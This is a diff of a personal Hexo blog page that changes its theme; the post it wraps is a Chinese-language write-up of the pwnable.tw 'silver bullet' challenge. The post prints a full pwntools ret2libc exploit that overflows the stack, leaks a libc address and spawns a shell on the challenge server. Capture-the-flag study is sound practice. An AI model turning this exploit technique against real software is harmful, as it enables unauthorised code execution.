@@ -1,196 +1,74 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/nana7777777mi/nana7777777mi.github.io/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/nana7777777mi/nana7777777mi.github.io/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/nana7777777mi/nana7777777mi.github.io/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/nana7777777mi/nana7777777mi.github.io/images/logo.svg" color="#222">
+<html>
 
+<head>
+    <meta charset="utf-8">
+    
+    <title>pwnable tw silverbullet writeup | WELCOME to nobody&#39;s homepage</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link rel="icon" href="/favicon/favicon.ico">
+    
 <link rel="stylesheet" href="/nana7777777mi/nana7777777mi.github.io/css/main.css">
 
+    
+<link rel="stylesheet" href="/nana7777777mi/nana7777777mi.github.io/css/tagplugins.css">
 
-<link rel="stylesheet" href="/nana7777777mi/nana7777777mi.github.io/lib/font-awesome/css/all.min.css">
+    
+<link rel="stylesheet" href="/nana7777777mi/nana7777777mi.github.io/css/highlight.css">
 
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/nana7777777mi/nana7777777mi.github.io/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="题目考点 strncmp等危险函数导致的栈溢出 ret2libc   解题思路  题目中给出了libc文件，先用patchelf搞定本地环境方便调试;  checksec，发现是32位程序没开canary和PIE，进入ida分析:  main()提供了操作菜单，且只有beat返回值非0(即赢得游戏)才能return，进行ROP: 12345678910111213141516171819202">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwnable tw silverbullet writeup">
-<meta property="og:url" content="https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/index.html">
-<meta property="og:site_name" content="WELCOME to nobody&#39;s homepage">
-<meta property="og:description" content="题目考点 strncmp等危险函数导致的栈溢出 ret2libc   解题思路  题目中给出了libc文件，先用patchelf搞定本地环境方便调试;  checksec，发现是32位程序没开canary和PIE，进入ida分析:  main()提供了操作菜单，且只有beat返回值非0(即赢得游戏)才能return，进行ROP: 12345678910111213141516171819202">
-<meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-11-13T07:50:23.000Z">
-<meta property="article:modified_time" content="2021-11-13T07:50:44.315Z">
-<meta property="article:author" content="inva1id">
-<meta property="article:tag" content="pwnable | bof | ret2libc">
-<meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/">
+    
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh-CN'
-  };
-</script>
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/nana7777777mi/nana7777777mi.github.io/atom.xml" title="WELCOME to nobody&#39;s homepage" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
 
-  <title>pwnable tw silverbullet writeup | WELCOME to nobody's homepage</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/nana7777777mi/nana7777777mi.github.io/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">WELCOME to nobody's homepage</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">pwn for fun not for profit</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
+<body>
+  <div class="blog-header">
+   <a id="menu-nav-icon"><img src="/nana7777777mi/nana7777777mi.github.io/image/menu.png"/></a>
+   <div class="nav-container">
+     <nav id="main-nav">
+       
+         <a class="main-nav-link" href="/nana7777777mi/nana7777777mi.github.io/">Home</a>
+       
+         <a class="main-nav-link" href="/nana7777777mi/nana7777777mi.github.io/archives">Archives</a>
+       
+     </nav>
+   </div>
+   <!--
+   <div id="search-form-wrap">
+     <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://github.com/nana7777777mi/nana7777777mi.github.io"></form>
+   </div>
+ -->
+    <h1 class="blog-title">WELCOME to nobody&#39;s homepage</h1>
+    <p class="lead blog-description">pwn for fun not for profit</p>
 </div>
 
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/nana7777777mi/nana7777777mi.github.io/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/nana7777777mi/nana7777777mi.github.io/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
+  <div id='main-part'>
+      <div class="main">
+<div class="blog-post">
+    <!-- Title -->
+    <h1 class="blog-post-title">
+        <a href="/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/">
+            Pwnable Tw Silverbullet Writeup
+        </a>
+    </h1>
+    <!-- Date and Author -->
+    <p class="blog-post-meta">
+        2021-11-13
+        
+    </p>
 
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
 
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/nana7777777mi/nana7777777mi.github.io/images/avatar.gif">
-      <meta itemprop="name" content="inva1id">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="WELCOME to nobody's homepage">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          pwnable tw silverbullet writeup
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-11-13 15:50:23 / 修改时间：15:50:44" itemprop="dateCreated datePublished" datetime="2021-11-13T15:50:23+08:00">2021-11-13</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-        <span id="more"></span>
+    <!-- Content -->
+    <span id="more"></span>
 
 <h2 id="题目考点"><a href="#题目考点" class="headerlink" title="题目考点"></a>题目考点</h2><ul>
 <li>strncmp等危险函数导致的栈溢出</li>
@@ -208,195 +86,94 @@
 
 <hr>
 <h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>, <span class="number">10103</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./silver_bullet&quot;)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./silver_bullet&quot;</span>)</span><br><span class="line">l = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#input()</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">creat</span>(<span class="params">data</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">	p.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me your description of bullet :&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">power</span>(<span class="params">data</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">	p.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Give me your another description of bullet :&quot;</span>)</span><br><span class="line">	p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">beat</span>():</span></span><br><span class="line">	p.recvuntil(<span class="string">b&quot;Your choice :&quot;</span>)</span><br><span class="line">	p.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload1 = p32(<span class="number">0xfffff111</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">3</span> + p32(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p32(e.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(e.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">power(payload1)</span><br><span class="line">beat()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Oh ! You win !!\n&quot;</span>)</span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - l.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bins_addr = libc_base + <span class="built_in">next</span>(l.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">syst_addr = libc_base + l.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">creat(<span class="string">b&quot;a&quot;</span> * <span class="number">0x2f</span>)</span><br><span class="line">power(<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">payload2 = p32(<span class="number">0xfffff111</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">3</span> + p32(syst_addr) + p32(e.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(bins_addr)</span><br><span class="line">power(payload2)</span><br><span class="line">beat()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Oh ! You win !!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-    </div>
 
+    <!-- Social share choices -->
     
-    
-    
-
-      <footer class="post-footer">
-          <div class="post-tags">
-              <a href="/nana7777777mi/nana7777777mi.github.io/tags/pwnable-bof-ret2libc/" rel="tag"># pwnable | bof | ret2libc</a>
-          </div>
-
-        
-
-
-        
-    <div class="post-nav">
-      <div class="post-nav-item">
-    <a href="/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-hacknote-writeup/" rel="prev" title="pwnable tw hacknote writeup">
-      <i class="fa fa-chevron-left"></i> pwnable tw hacknote writeup
-    </a></div>
-      <div class="post-nav-item">
-    <a href="/nana7777777mi/nana7777777mi.github.io/2021/11/14/pwnable-tw-applestore-writeup/" rel="next" title="pwnable tw applestore writeup">
-      pwnable tw applestore writeup <i class="fa fa-chevron-right"></i>
-    </a></div>
-    </div>
-      </footer>
-    
-  </article>
-  
-  
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
+  <div id="social-share">
+    <a data-url="https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/" target="_blank" rel="noopener" href="https://plus.google.com/share?url=" class="googleplus"><img src="/nana7777777mi/nana7777777mi.github.io/image/googleplusicon.png" alt=""/></a>
+    <a data-url="https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/" target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?url=" class="twitter"><img src="/nana7777777mi/nana7777777mi.github.io/image/twittericon.png" alt=""/></a>
+    <a data-url="https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/" target="_blank" rel="noopener" href="http://pinterest.com/pin/create/button/?url=" class="pinterest"><img src="/nana7777777mi/nana7777777mi.github.io/image/pinteresticon.png" alt=""/></a>
+    <a data-url="https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/" target="_blank" rel="noopener" href="https://www.facebook.com/sharer/sharer.php?u=" class="facebook"><img src="/nana7777777mi/nana7777777mi.github.io/image/facebookicon.png" alt=""/></a>
   </div>
 
-  <aside class="sidebar">
-    <div class="sidebar-inner">
 
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
 
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E8%80%83%E7%82%B9"><span class="nav-number">1.</span> <span class="nav-text">题目考点</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">3.</span> <span class="nav-text">exploit</span></a></li></ol></div>
-      </div>
-      <!--/noindex-->
 
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">inva1id</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/nana7777777mi/nana7777777mi.github.io/archives/">
-        
-          <span class="site-state-item-count">6</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-      <div class="site-state-item site-state-tags">
-        <span class="site-state-item-count">5</span>
-        <span class="site-state-item-name">标签</span>
-      </div>
-  </nav>
+
+<!--
+
+
+https://www.facebook.com/sharer/sharer.php?u=https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/
+https://github.com/nana7777777mi/nana7777777mi.github.io/2021/11/13/pwnable-tw-silverbullet-writeup/
+-->
+
+
+
+    <hr />
+
+
+    <!-- Tags and Categories links -->
+    
+
+    
+
+
+<div class="blog-tags-container">
+    <span><img src="/nana7777777mi/nana7777777mi.github.io/image/tagsicon.png" alt=""/></span>
+    <a href="/nana7777777mi/nana7777777mi.github.io/tags/pwnable-bof-ret2libc/">#pwnable | bof | ret2libc</a>
 </div>
 
 
 
-      </div>
+    <!-- Comment using disqus -->
+    
 
-    </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
-        
-
-        
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2021</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">inva1id</span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+</div>
+
+
   </div>
+  <!-- Footer -->
+  <div id="footer">
+  <div id="footer-social">
+    
+    
+    
+    
+    
+    
+</div>
 
-        
+  <p id="footer-info">
+    &copy; 2021 inva1id<br>
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> -
+    主题 <a href="https://github.com/Suolawangzai/hexo-theme-nebula" target="_blank">nebula</a>
+  </p>
 
-
-
-
-
-
-
-
-      </div>
-    </footer>
+  <div id="busuanzi">
+    <span id="busuanzi_container_site_pv">
+      &hearts;
+    总访问量: <span id="busuanzi_value_site_pv"></span>
+    </span>
   </div>
+  <!--
+  <div id="footer-info">
+    &copy; 2021 inva1id<br>
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+  </div>
+-->
+</div>
 
-  
-  <script src="/nana7777777mi/nana7777777mi.github.io/lib/anime.min.js"></script>
-  <script src="/nana7777777mi/nana7777777mi.github.io/lib/velocity/velocity.min.js"></script>
-  <script src="/nana7777777mi/nana7777777mi.github.io/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/nana7777777mi/nana7777777mi.github.io/js/utils.js"></script>
-
-<script src="/nana7777777mi/nana7777777mi.github.io/js/motion.js"></script>
-
-
-<script src="/nana7777777mi/nana7777777mi.github.io/js/schemes/muse.js"></script>
+  <!-- After footer scripts -->
+  <!-- Disqus Comments -->
 
 
-<script src="/nana7777777mi/nana7777777mi.github.io/js/next-boot.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
+<script src="/nana7777777mi/nana7777777mi.github.io/js/main.js"></script>
 
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
 
 <script src="/nana7777777mi/nana7777777mi.github.io/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
 </html>
